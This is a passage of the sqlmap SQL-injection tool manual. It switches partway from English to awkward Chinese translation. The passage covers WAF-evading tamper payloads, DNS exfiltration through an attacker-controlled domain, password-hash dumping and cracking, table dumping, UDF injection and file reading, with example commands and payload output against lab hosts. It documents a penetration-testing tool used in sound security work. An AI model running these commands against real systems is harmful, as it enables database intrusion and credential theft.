* HSQLDB
* Informix

If for any reason sqlmap fails to detect the back-end DBMS once a SQL injection has been identified or if you want to avoid an active fingeprint, you can provide the name of the back-end DBMS yourself (e.g. `postgresql`). For MySQL and Microsoft SQL Server provide them respectively in the form `MySQL  <version>` and `Microsoft SQL Server  <version> `, where ` <version>` is a valid version for the DBMS; for instance `5.0` for MySQL and `2005` for Microsoft SQL Server.

In case you provide `--fingerprint` together with `--dbms`, sqlmap will only perform the extensive fingerprint for the specified database management system only, read below for further details. 

Note that this option is **not** mandatory and it is strongly recommended to use it **only if you are absolutely sure** about the back-end database management system. If you do not know it, let sqlmap automatically fingerprint it for you.

### Force the database management system operating system name

Option: `--os`

By default sqlmap automatically detects the web application's back-end database management system underlying operating system when this information is a dependence of any other provided switch or option. At the moment the fully supported operating systems are:

* Linux
* Windows

It is possible to force the operating system name if you already know it so that sqlmap will avoid doing it itself.

Note that this option is **not** mandatory and it is strongly recommended to use it **only if you are absolutely sure** about the back-end database management system underlying operating system. If you do not know it, let sqlmap automatically identify it for you. 

### Force usage of big numbers for invalidating values

Switch: `--invalid-bignum`

In cases when sqlmap needs to invalidate original parameter value (e.g. `id=13`) it uses classical negation (e.g. `id=-13`). With this switch it is possible to force the usage of large integer values to fulfill the same goal (e.g. `id=99999999`).

### Force usage of logical operations for invalidating values

Switch: `--invalid-logical`

In cases when sqlmap needs to invalidate original parameter value (e.g. `id=13`) it uses classical negation (e.g. `id=-13`). With this switch it is possible to force the usage of boolean operations to fulfill the same goal (e.g. `id=13 AND 18=19`).

### Force usage of random strings for invalidating values

Switch: `--invalid-string`

In cases when sqlmap needs to invalidate original parameter value (e.g. `id=13`) it uses classical negation (e.g. `id=-13`). With this switch it is possible to force the usage of random strings to fulfill the same goal (e.g. `id=akewmc`).

### Turn off payload casting mechanism

Switch: `--no-cast`

When retrieving results, sqlmap uses a mechanism where all entries are being casted to string type and replaced with a whitespace character in case of `NULL` values. That is being made to prevent any erroneous states (e.g. concatenation of `NULL` values with string values) and to easy the data retrieval process itself. Nevertheless, there are reported cases (e.g. older versions of MySQL DBMS) where this mechanism needed to be turned-off (using this switch) because of problems with data retrieval itself (e.g. `None` values are returned back).

### Turn off string escaping mechanism

Switch: `--no-escape`

In cases when sqlmap needs to use (single-quote delimited) string values inside payloads (e.g. `SELECT 'foobar'`), those values are automatically being escaped (e.g. `SELECT CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114)`). That is being done because of two things: obfuscation of payload content and preventing potential problems with query escaping mechanisms (e.g. `magic_quotes` and/or `mysql_real_escape_string`) at the back-end server. User can use this switch to turn it off (e.g. to reduce payload size).

### Custom injection payload

Options: `--prefix` and `--suffix`

In some circumstances the vulnerable parameter is exploitable only if the user provides a specific suffix to be appended to the injection payload. Another scenario where these options come handy presents itself when the user already knows that query syntax and want to detect and exploit the SQL injection by directly providing a injection payload prefix and suffix. 

Example of vulnerable source code:

    $query = "SELECT * FROM users WHERE id=('" . $_GET['id'] . "') LIMIT 0, 1";

To detect and exploit this SQL injection, you can either let sqlmap detect the **boundaries** (as in combination of SQL payload prefix and suffix) for you during the detection phase, or provide them on your own.

For example: 

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php\
?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"
[...]
```

This will result in all sqlmap requests to end up in a query as follows:

    $query = "SELECT * FROM users WHERE id=('1') <PAYLOAD> AND ('abc'='abc') LIMIT 0, 1";

Which makes the query syntactically correct.

In this simple example, sqlmap could detect the SQL injection and exploit it without need to provide custom boundaries, but sometimes in real world application it is necessary to provide it when the injection point is within nested `JOIN` queries for instance. 

### Tamper injection data

Option: `--tamper`

sqlmap itself does no obfuscation of the payload sent, except for strings between single quotes replaced by their `CHAR()`-alike representation. 

This option can be very useful and powerful in situations where there is a weak input validation mechanism between you and the back-end database management system. This mechanism usually is a self-developed input validation routine called by the application source code, an expensive enterprise-grade IPS appliance or a web application firewall (WAF). All buzzwords to define the same concept, implemented in a different way and costing lots of money, usually. 

To take advantage of this option, provide sqlmap with a comma-separated list of tamper scripts and this will process the payload and return it transformed. You can define your own tamper scripts, use sqlmap ones from the `tamper/` folder or edit them as long as you concatenate them comma-separated as value of the option `--tamper` (e.g. `--tamper="between,randomcase"`). 

The format of a valid tamper script is as follows:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ {.python}
# Needed imports
from lib.core.enums import PRIORITY

# Define which is the order of application of tamper scripts against
# the payload
__priority__ = PRIORITY.NORMAL

def tamper(payload):
    '''
    Description of your tamper script
    '''

    retVal = payload

    # your code to tamper the original payload

    # return the tampered payload
    return retVal
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 

You can check valid and usable tamper scripts in the `tamper/` directory.

Example against a MySQL target assuming that `>` character, spaces and capital `SELECT` string are banned:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --\
tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3

[hh:mm:03] [DEBUG] cleaning up configuration parameters
[hh:mm:03] [INFO] loading tamper script 'between'
[hh:mm:03] [INFO] loading tamper script 'randomcase'
[hh:mm:03] [INFO] loading tamper script 'space2comment'
[...]
[hh:mm:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092
[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057
[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041
[...]
[hh:mm:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause
'
[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONC
AT(cHar(58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/
**/elsE/**/0/**/ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/info
rmation_schema.tables/**/group/**/bY/**/x)a)
[hh:mm:04] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or
 HAVING clause' injectable 
[...]
```

## Detection

These options can be used to customize the detection phase.

### Level

Option: `--level`

This option requires an argument which specifies the level of tests to perform. There are **five** levels. The default value is **1** where limited number of tests (requests) are performed. Vice versa, level **5** will test verbosely for a much larger number of payloads and boundaries (as in pair of SQL payload prefix and suffix). The payloads used by sqlmap are specified in the textual file `xml/payloads.xml`. Following the instructions on top of the file, if sqlmap misses an injection, you should be able to add your own payload(s) to test for too!

Not only this option affects which payload sqlmap tries, but also which injection points are taken in exam: GET and POST parameters are **always** tested, HTTP Cookie header values are tested from level **2** and HTTP User-Agent/Referer headers' value is tested from level **3**.

All in all, the harder it is to detect a SQL injection, the higher the `--level` must be set.

It is strongly recommended to higher this value before reporting to the mailing list that sqlmap is not able to detect a certain injection point. 

### Risk

Option: `--risk`

This option requires an argument which specifies the risk of tests to perform. There are **three** risk values. The default value is **1** which is innocuous for the majority of SQL injection points. Risk value 2 adds to the default level the tests for heavy query time-based SQL injections and value 3 adds also `OR`-based SQL injection tests.

In some instances, like a SQL injection in an `UPDATE` statement, injecting an `OR`-based payload can lead to an update of all the entries of the table, which is certainly not what the attacker wants. For this reason and others this option has been introduced: the user has control over which payloads get tested, the user can arbitrarily choose to use also potentially dangerous ones. As per the previous option, the payloads used by sqlmap are specified in the textual file `xml/payloads.xml` and you are free to edit and add your owns.

### Page comparison

Options: `--string`, `--not-string`, `--regexp` and `--code`

By default the distinction of a `True` query from a `False` one (rough concept behind boolean-based blind SQL injection vulnerabilities) is done by comparing the injected requests page content with the original not injected page content.
Not always this concept works because sometimes the page content changes at each refresh even not injecting anything, for instance when the page has a counter, a dynamic advertisement banner or any other part of the HTML which is rendered dynamically and might change in time not only consequently to user's input. To bypass this limit, sqlmap tries hard to identify these snippets of the response bodies and deal accordingly. Sometimes it may fail, that is why the user can provide a string (`--string` option) which **should** be present on original page (though it is not a requirement) **and** on all True injected query pages, but that it is **not** on the False ones. Instead of static string, the user can provide a regular expression (`--regexp` option). Alternatively, user can provide a string (`--not-string` option) which is **not** present on original page **and** not on all True injected query pages, but appears **always** on False ones.

Such data is easy for an user to retrieve, simply try to inject into the affected parameter an invalid value and compare manually the original (not injected) page content with the injected wrong page content. This way the distinction will be based upon string presence or regular expression match. 

In cases when user knows that the distinction of a `True` query from a `False` one can be done using HTTP code (e.g. `200` for `True` and `401` for `False`), he can provide that information to sqlmap (e.g. `--code=200`).

Switches: `--text-only` and `--titles`

In cases when user knows that the distinction of a `True` query from a `False` one can be done using HTML title (e.g. `Welcome` for `True` and `Forbidden` for `False`), he can turn turn on title-based comparison using switch `--titles`.

In cases with lot of active content (e.g. scripts, embeds, etc.) in the HTTP responses' body, you can filter pages (switch `--text-only`) just for their textual content. This way, in a good number of cases, you can automatically tune the detection engine.

## Techniques

These options can be used to tweak testing of specific SQL injection techniques.

### SQL injection techniques to test for

Option: `--technique`

This option can be used to specify which SQL injection type to test for. By default sqlmap tests for **all** types/techniques it supports.

In certain situations you may want to test only for one or few specific types of SQL injection thought and this is where this option comes into play. 

This option requires an argument. Such argument is a string composed by any combination of `B`, `E`, `U`, `S`, `T` and `Q` characters where each letter stands for a different technique: 

* `B`: Boolean-based blind
* `E`: Error-based
* `U`: Union query-based
* `S`: Stacked queries
* `T`: Time-based blind
* `Q`: Inline queries

For instance, you can provide `ES` if you want to test for and exploit error-based and stacked queries SQL injection types only. The default value is `BEUSTQ`. 

Note that the string must include stacked queries technique letter, `S`, when you want to access the file system, takeover the operating system or access Windows registry hives. 

### Seconds to delay the DBMS response for time-based blind SQL injection

Option: `--time-sec`

It is possible to set the seconds to delay the response when testing for time-based blind SQL injection, by providing the `--time-sec` option followed by an integer. By default it's value is set to **5 seconds**. 

### Number of columns in UNION query SQL injection

Option: `--union-cols`

By default sqlmap tests for UNION query SQL injection technique using 1 to 10 columns. However, this range can be increased up to 50 columns by providing an higher `--level` value. See the relevant paragraph for more details. 

You can manually tell sqlmap to test for this type of SQL injection with a specific range of columns by providing the tool with the option `--union-cols` followed by a range of integers. For instance, `12-16` means tests for UNION query SQL injection by using 12 up to 16 columns. 

### Character to use to test for UNION query SQL injection

Option: `--union-char`

By default sqlmap tests for UNION query SQL injection technique using `NULL` character. However, by providing a higher `--level` value sqlmap will performs tests also with a random number because there are some corner cases where UNION query tests with `NULL` fail, whereas with a random integer they succeed.

You can manually tell sqlmap to test for this type of SQL injection with a specific character by using option `--union-char` with desired character value (e.g. `--union-char 123`).

### Table to use in FROM part of UNION query SQL injection

Option: `--union-from`

In some UNION query SQL injection cases there is a need to enforce the usage of valid and accessible table name in `FROM` clause. For example, Microsoft Access requires usage of such table. Without providing one UNION query SQL injection won't be able to perform correctly (e.g. `--union-from=users`).

### DNS exfiltration attack

Option: `--dns-domain`

DNS exfiltration SQL injection attack is described in paper [Data Retrieval over DNS in SQL Injection Attacks](http://arxiv.org/pdf/1303.3047.pdf), while presentation of it's implementation inside sqlmap can be found in slides [DNS exfiltration using sqlmap](http://www.slideshare.net/stamparm/dns-exfiltration-using-sqlmap-13163281).

If user is controlling a machine registered as a DNS domain server (e.g. domain `attacker.com`) he can turn on this attack by using this option (e.g. `--dns-domain attacker.com`). Prerequisites for it to work is to run a sqlmap with `Administrator` privileges (usage of privileged port `53`) and that one normal (blind) technique is available for exploitation. That's solely the purpose of this attack is to speed up the process of data retrieval in case that at least one technique has been identified (in best case time-based blind). In case that error-based blind or UNION query techniques are available it will be skipped as those are preferred ones by default. 

### Second-order attack

Option: `--second-order`

Second-order SQL injection attack is an attack where result(s) of an injected payload in one vulnerable page is shown (reflected) at the other (e.g. frame). Usually that's happening because of database storage of user provided input at the original vulnerable page.

You can manually tell sqlmap to test for this type of SQL injection by using option `--second-order` with the URL address of the web page where results are being shown.

## Fingerprint

### 广泛的数据库管理系统 fingerprint

Switches: `-f` or `--fingerprint`

通过拖欠网络应用层的后端数据库管理系统fingerprint被sqlmap自动处理。就在检测阶段结束以后并且用户最终被提示以再进一步选择使用哪一个易受攻击的参数, sqlmap fingerprints 这个后端数据库管理系统并且继续通过了解使用哪一个SQL语法，特殊语言和查询这一注入来继续在数据库架构的范围之内进行攻击。

如果在任何情况下你想要执行一个广泛的基于各种技术例如特定的SQL语言和inband错误的信息的数据库管理系统fingerprint, 你可以 provide the switch `--fingerprint`. sqlmap 将会执行更多的请求并且 fingerprint 准确的 DBMS 版本并且在可能的情况下操作系统，结构和插线等级。 

如果你想要 fingerprint 得到更加精准的结果, 你也可以 provide the switch `-b` or `--banner`. 

## 枚举

这些选项可用于枚举表中包含的后端数据库管理系统信息、结构和数据。此外，还可以运行自己的SQL语句。

### 检索全部

开关: `--all`

这个开关可以在用户想通过使用一个开关来检索所有远程访问的情况下使用。这是不推荐的，因为它将生成大量请求检索有用和无用的数据。

### 标语

开关: `-b` or `--banner`

大多数现代数据库管理系统都有一个函数和/或一个环境变量，该变量返回数据库管理系统版本，并最终在其补丁级别(底层系统)上详细说明。通常函数是 `version()` 而环境变量是 `@@version`，但这取决于目标DBMS。

反对Oracle目标的例子:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int.php?id=1" -\
-banner

[...]
[xx:xx:11] [INFO] fetching banner
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: Oracle
banner:    'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'
```

### 会话用户

开关: `--current-user`

有了这个开关，就可以检索数据库管理系统的用户，该用户实际上是通过web应用程序对后端DBMS执行查询。

### 当前数据库

开关: `--current-db`

使用此开关，可以检索web应用程序连接到的数据库管理系统的数据库名称。

### 服务器主机名

开关: `--hostname`

使用这个开关，可以检索数据库管理系统的主机名。

针对MySQL目标的例子:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --\
hostname

[...]
[xx:xx:04] [INFO] fetching server hostname
[xx:xx:04] [INFO] retrieved: debian-5.0-i386
hostname:    'debian-5.0-i386'
```

### 检测会话用户是否是数据库管理员

开关: `--is-dba`

如果当前的数据库管理系统会话用户是数据库管理员，也称为DBA，则可以检测到它。如果是，sqlmap将返回 `True` ，反之亦然。

### 列出数据库管理系统的用户

开关: `--users`

当会话用户读取包含DBMS用户信息的系统表时，可以枚举用户列表。

### 列表和破解数据库管理系统用户密码散列

开关: `--passwords`

当会话用户读取包含关于DBMS用户密码信息的系统表的访问时，可以为每个数据库管理系统用户枚举密码散列。sqlmap将首先枚举用户，然后对每个用户进行不同的密码散列。

针对PostgreSQL目标的例子:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --\
passwords -v 1

[...]
back-end DBMS: PostgreSQL
[hh:mm:38] [INFO] fetching database users password hashes
do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y
[hh:mm:42] [INFO] using hash method: 'postgres_passwd'
what's the dictionary's location? [/software/sqlmap/txt/wordlist.txt] 
[hh:mm:46] [INFO] loading dictionary from: '/software/sqlmap/txt/wordlist.txt'
do you want to use common password suffixes? (slow!) [y/N] n
[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)
[hh:mm:49] [INFO] found: 'testpass' for user: 'testuser'
[hh:mm:50] [INFO] found: 'testpass' for user: 'postgres'
database management system users password hashes:
[*] postgres [1]:
    password hash: md5d7d880f96044b72d0bba108ace96d1e4
    clear-text password: testpass
[*] testuser [1]:
    password hash: md599e5ea7a6f7c3269995cba3927fd0093
    clear-text password: testpass
```

sqlmap不仅枚举DBMS用户和密码,同时，它也能识别出是PostgreSQL的散列格式,问用户是否要对字典文件进行测试，并且为postgres的用户确认明文密码,这通常沿着其他用户的DBA,`testuser`,密码。

这个特性已经在所有DBMS中实现，在那里可以枚举用户的密码散列，包括Oracle和Microsoft SQL Server pre和post 2005。

您还可以提供选项 `-U` 来指定要枚举的特定用户，并最终破解密码散列。如果您提供 `CU` 作为用户名，它将把它视为当前用户的别名，并将为该用户检索密码散列。

### 列表数据库管理系统用户权限

开关: `--privileges`

当会话用户访问包含DBMS用户信息的系统表时，可以枚举每个数据库管理系统用户的特权。通过特权，sqlmap还将显示哪些是数据库管理员。

您还可以提供选项 `-U` 来指定要枚举特权的用户。

如果您提供 `CU` 作为用户名，它将把它视为当前用户的别名，并将枚举该用户的特权。

在Microsoft SQL Server上，这个特性将显示每个用户是否是数据库管理员，而不是所有用户的特权列表。

### 列表数据库管理系统用户角色

开关: `--roles`

当会话用户读取到包含DBMS用户信息的系统表时，可以枚举每个数据库管理系统用户的角色。

您还可以提供选项 `-U` 来指定要枚举特权的用户。

如果您提供 `CU` 作为用户名，它将把它视为当前用户的别名，并将枚举该用户的特权。

只有当DBMS是Oracle时，该特性才可用。

### List数据库管理系统的数据库

开关: `--dbs`

当会话用户读取包含可用数据库信息的系统表的访问时，可以枚举数据库列表。

### 列举数据库的表

开关和选项: `--tables`, `--exclude-sysdbs` 和 `-D`

当会话用户读取包含数据库表信息的系统表时，可以枚举特定数据库管理系统数据库的表列表。

如果您不提供特定的数据库选项`-D`，sqlmap将枚举所有DBMS数据库的表。

您还可以提供开关`--exclude-sysdbs`来排除所有系统数据库。

请注意，在Oracle上必须提供`TABLESPACE_NAME`而不是数据库名。

### 列举数据库表列

开关和选项: `--columns`, `-C`, `-T` 和 `-D`

当会话用户读取包含数据库表信息的系统表时，可以枚举特定数据库表的列列表。sqlmap还枚举每个列的数据类型。


该特性依赖于选项`-T` 来指定表名，并可选在`-D`上指定数据库名称。当没有指定数据库名称时，将使用当前数据库名称。您还可以提供 `-C`选项来指定表列名称，如您所提供的枚举类型。

针对SQLite目标的例子:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" -\
-columns -D testdb -T users -C name
[...]
Database: SQLite_masterdb
Table: users
[3 columns]
+---------+---------+
| Column  | Type    |
+---------+---------+
| id      | INTEGER |
| name    | TEXT    |
| surname | TEXT    |
+---------+---------+
```

请注意，在PostgreSQL上必须提供`public`或系统数据库的名称。这是因为不可能枚举其他数据库表，只有在web应用程序的用户连接到的模式下的表，它总是被`public`所定义。

### 枚举数据库管理系统模式

开关: `--schema` 和 `--exclude-sysdbs`

用户可以通过使用这个开关来检索DBMS模式。模式清单将包含所有数据库、表和列，以及它们各自的类型。与`--exclude-sysdbs`相结合，将检索并显示包含非系统数据库的模式的一部分。

针对MySQL目标的例子:

```
$ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --s\
chema--batch --exclude-sysdbs

[...]
Database: owasp10
Table: accounts
[4 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+

Database: owasp10
Table: blogs_table
[4 columns]
+--------------+----------+
| Column       | Type     |
+--------------+----------+
| date         | datetime |
| blogger_name | text     |
| cid          | int(11)  |
| comment      | text     |
+--------------+----------+

Database: owasp10
Table: hitlog
[6 columns]
+----------+----------+
| Column   | Type     |
+----------+----------+
| date     | datetime |
| browser  | text     |
| cid      | int(11)  |
| hostname | text     |
| ip       | text     |
| referer  | text     |
+----------+----------+

Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
[...]
```

### 检索表的条目数

开关: `--count`

如果用户只想知道在转储所需的表之前的表中的条目数，他可以使用这个开关。

针对Microsoft SQL服务器目标的例子:

```
$ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1"\
 --count -D testdb
[...]
Database: testdb
+----------------+---------+
| Table          | Entries |
+----------------+---------+
| dbo.users      | 4       |
| dbo.users_blob | 2       |
+----------------+---------+
```

### 把数据库表条目

开关和选项: `--dump`, `-C`, `-T`, `-D`, `--start`, `--stop`, `--first`, `--last`, `--pivot-column` 和 `--where`

当会话用户访问特定数据库的表时，可以转储表项。

这个功能依赖于选项`-T`来指定表名，或者选择`-D` 来指定数据库名称。如果提供了表名，但数据库名不是，则使用当前数据库名称。

针对Firebird目标的例子:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1"\
 --dump -T users
[...]
Database: Firebird_masterdb
Table: USERS
[4 entries]
+----+--------+------------+
| ID | NAME   | SURNAME    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+
```

这个开关还可以用来转储提供的数据库的所有表的条目。你只需要提供sqlmap和开关`--dump`以及只有选项`-D`(不用`-T`和`-C`)。

您还可以提供与选项 `-C`转储的特定列的逗号分隔列表。

sqlmap也为每个表生成一个CSV格式文本文件中的条目。通过提供大于或等于**1**的赘言级别，可以看到sqlmap创建文件的绝对路径。

如果您只想转储一系列的条目，那么您可以提供选项 `--start`和/或`--stop`，分别从某个条目开始转储，并在某个条目中停止转储。例如，如果只想转储第一个条目，则在命令行中提供`--stop 1` 。反之亦然，例如，如果您想只转储第二个和第三个条目，则提供`--start 1` `--stop 3`。

还可以指定要转储哪些单个字符或字符的范围`--first` 和 `--last`。例如，如果您想将列的条目从第三个字符转储到第五个字符，则提供`--first 3` `--last 5`。这个特性只适用于盲SQL注入技术，因为对于基于errorsql的和UNION查询SQL注入技术，请求的数量是完全相同的，无论列的输入输出的长度是多少。

有时(例如，对于Microsoft SQL Server、Sybase和SAP MaxDB)，使用`OFFSET m, n`机制来直接转储表行是不可能的，因为缺少类似的机制。在这种情况下，sqlmap通过确定最合适的`pivot`列(具有最独特的值的)来转储内容，这些值稍后将用于检索其他列值。如果需要执行特定的`pivot`列的使用，因为自动选择的一个不合适(例如由于缺少表转储结果)，您可以使用选项`--pivot-column`(例如，`--pivot-column=id`)。

如果您希望将转储限制为特定的列值(或范围)，则可以使用选项 `--where`。在`WHERE`子句中，提供了逻辑操作。例如，如果使用`--where="id>3"`唯一表行具有大于3的列`id`值的表行将会被检索(通过追加 `WHERE id>3` 来使用转储查询)。

正如您现在已经注意到的，sqlmap是 **灵活的**:您可以让它自动转储整个数据库表，或者您可以非常精确地从哪个字符转储，从哪个列和哪个范围的条目中转储。


### 转储所有数据库表条目

开关: `--dump-all` 和 `--exclude-sysdbs`

可以立即转储所有数据库表条目，会话用户可以读取访问。

您还可以提供开关 `--exclude-sysdbs` 来排除所有系统数据库。在这种情况下，sqlmap只会转储用户数据库表的条目。

注意，在Microsoft SQL Server上，`master` 数据库不被视为系统数据库，因为一些数据库管理员将其用作用户数据库。

### 搜索列、表或数据库

开关和选项: `--search`, `-C`, `-T`, `-D`

这个开关允许您 **搜索特定的数据库名称、跨所有数据库的特定表或跨所有数据库表的特定列。**. 

例如，这对于识别包含自定义应用程序凭据的表是有用的，在这些表中，相关列的名称包含_name_和_pass_等字符串。

开关`--search`需要与以下支持选项之一一起使用:

* `-C` 遵循逗号分隔的列名列表，以便在整个数据库管理系统中查找。
* `-T` 遵循逗号分隔的表名，以便在整个数据库管理系统中查找。
* `-D` 遵循逗号分隔的数据库名称来查找整个数据库管理系统。

### 运行自定义SQL语句

选项和开关: `--sql-query` 和 `--sql-shell`

SQL查询和SQL shell特性允许在数据库管理系统上运行任意的SQL语句。sqlmap会自动地剖析所提供的语句，确定使用哪种技术注入它以及如何相应地打包SQL有效负载。

如果查询是`SELECT`语句，sqlmap将检索其输出。否则，如果web应用程序支持后端数据库管理系统上的多个语句，它将通过堆叠查询SQL注入技术来执行查询。请注意，某些web应用程序技术不支持对特定的数据库管理系统进行堆叠查询。例如，当后端DBMS是MySQL时，PHP不支持堆叠查询，但它支持后端DBMS是PostgreSQL。

针对Microsoft SQL Server 2000目标的示例:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --\
sql-query "SELECT 'foo'" -v 1

[...]
[hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
[hh:mm:14] [INFO] retrieved: foo
SELECT 'foo':    'foo'

$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --\
sql-query "SELECT 'foo', 'bar'" -v 2

[...]
[hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now 
unpack it into distinct queries to be able to retrieve the output even if we are
 going blind
[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS 
VARCHAR(8000)), (CHAR(32)))
[hh:mm:50] [INFO] retrieved: foo
[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VA
RCHAR(8000)), (CHAR(32)))
[hh:mm:50] [INFO] retrieved: bar
[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
SELECT 'foo', 'bar':    'foo, bar'
```

如您所见，sqlmap将提供的查询拆分为两个不同的 `SELECT` statements then retrieves the output for each separate query. 

如果提供的查询是一个 `SELECT`语句并包含一个`FROM`子句，sqlmap将询问这样的语句是否可以返回多个条目。在这种情况下，该工具知道如何正确地解压查询，以计数可能的条目的数量并检索它的输出，每个条目的条目。

SQL shell选项允许您交互式地运行自己的SQL语句，就像连接到数据库管理系统的SQL控制台一样。这个功能也提供了标签完成和历史支持。
破解

### 暴力

这些开关可以用来运行暴力检查。

### 暴力表名称

开关: `--common-tables`

有些情况下，开关`--tables`不能用于检索数据库的表名。这些案件通常属于以下类别之一:

* 数据库管理系统是MySQL **< 5.0** ，在这里不提供 `information_schema`。
* 数据库管理系统是Microsoft Access，系统表 `MSysObjects` 是不可读的 - 默认设置。
* 会话用户不具有对存储数据库方案的系统表的权限。

如果前两个案例中的任何一个应用，并且您提供了开关 `--tables`，sqlmap将提示您一个问题
回到这个技巧。这两种情况中的任何一个都适用于您的情况，sqlmap可能仍然可以识别一些现有的表，如果您提供了开关 `--common-tables`。sqlmap将执行蛮力攻击，以检测DBMS中常见表的存在。

常用表名的列表是 `txt/common-tables.txt` 。你可以随意编辑它。

针对MySQL 4.1目标的例子:

```
$ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --commo\
n-tables -D testdb --banner

[...]
[hh:mm:39] [INFO] testing MySQL
[hh:mm:39] [INFO] confirming MySQL
[hh:mm:40] [INFO] the back-end DBMS is MySQL
[hh:mm:40] [INFO] fetching banner
web server operating system: Windows
web application technology: PHP 5.3.1, Apache 2.2.14
back-end DBMS operating system: Windows
back-end DBMS: MySQL < 5.0.0
banner:    '4.1.21-community-nt'

[hh:mm:40] [INFO] checking table existence using items from '/software/sqlmap/tx
t/common-tables.txt'
[hh:mm:40] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 8
[hh:mm:43] [INFO] retrieved: users

Database: testdb
[1 table]
+-------+
| users |
+-------+
```

### 暴力列名

开关: `--common-columns`

根据表，有一些情况下，开关 `--columns`不能用于检索数据库的表的列名。这些案件通常属于以下类别之一: 

* 数据库管理系统是MySQL**< 5.0**，没有提供`information_schema` 。
* 数据库管理系统是Microsoft Access，这种信息在系统表中是不可用的。
* 会话用户不具有对存储数据库方案的系统表的权限。

如果前两个案例中的任何一个应用，并且您提供了开关 `--columns`，sqlmap将提示您一个问题
回到这个技巧。这两种情况中的任何一个都适用于您的情况，sqlmap可能仍然可以识别一些现有的表，如果您提供了开关`--common-columns`。sqlmap将执行暴力攻击，以检测DBMS中常见的列的存在。

常用表名的列表是`txt/common-columns.txt`。你可以随意编辑它。

## 用户定义函数注入

这些选项可用于创建自定义用户定义的函数。

### 注入自定义用户定义函数(UDF)

开关和选项: `--udf-inject` 和 `--shared-lib`

您可以通过编译一个MySQL或PostgreSQL共享库、为Linux / Unix的共享对象提供一个MySQL或PostgreSQL共享库、然后提供sqlmap和在您的机器上本地存储共享库的路径来注入您自己的用户定义函数(udf)。然后sqlmap会问你一些问题，在数据库服务器文件系统上上传共享库，创建用户定义的函数，根据你的选项执行它们。当您使用注入的udf完成后，sqlmap也可以将它们从数据库中删除。

这些技术在白皮书中很详细 [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857).

使用选项 `--udf-inject` 然后按指示进行。

如果需要，可以通过命令行指定共享库本地文件系统路径，也可以使用 `--shared-lib` 选项。反之亦然sqlmap会在运行时向您询问路径。

只有当数据库管理系统是MySQL或PostgreSQL时，此特性才可用。

## 文件系统访问

### 从数据库服务器的文件系统中读取文件

选项: `--file-read`

当后端数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时，从底层文件系统中检索文件的内容是可能的，会话用户有必要的特权来滥用数据库的特定功能和架构弱点。指定的文件可以是文本文件或二进制文件。sqlmap将正确处理它。

这些技术在白皮书中很详细 [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857).

针对Microsoft SQL Server 2005目标检索二进制文件的示例:

```
$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?nam\
e=luther" --file-read "C:/example.exe" -v 1

[...]
[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2000
web application technology: ASP.NET, Microsoft IIS 6.0, ASP
back-end DBMS: Microsoft SQL Server 2005

[hh:mm:50] [INFO] fetching file: 'C:/example.exe'
[hh:mm:50] [INFO] the SQL query provided returns 3 entries
